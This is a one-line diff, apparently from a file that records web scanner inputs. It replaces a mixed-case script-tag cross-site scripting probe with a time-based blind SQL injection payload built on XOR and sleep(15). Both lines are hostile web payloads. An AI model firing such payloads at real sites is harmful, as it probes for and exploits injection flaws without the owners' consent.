@@ -1,1 +1,1 @@
-555'"()&%<zzz><ScRiPt >8T7W(9292)</ScRiPt>
+5550"XOR(555*if(now()=sysdate(),sleep(15),0))XOR"Z
